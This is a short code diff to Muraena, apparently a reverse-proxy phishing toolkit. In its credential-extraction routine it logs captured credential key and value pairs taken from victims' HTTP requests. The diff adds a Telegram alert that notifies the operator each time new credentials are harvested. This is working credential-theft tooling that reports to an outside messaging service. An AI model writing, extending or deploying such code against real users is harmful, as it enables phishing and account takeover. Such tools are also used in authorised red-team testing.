@@ -13,6 +13,7 @@ import (
 	"time"
 
 	"github.com/manifoldco/promptui"
+	"github.com/muraenateam/muraena/module/telegram"
 
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/core/db"
@@ -450,8 +451,14 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 						if err != nil {
 							return false, err
 						}
-						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds. Value)
+						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
 						found = true
+
+						tel := telegram.Self(t.Session)
+						if tel != nil {
+							message := fmt.Sprintf("[%s] New credentials! [%s]", t.ID, creds.Key)
+							tel.Send(message)
+						}
 					}
 				}
 			}
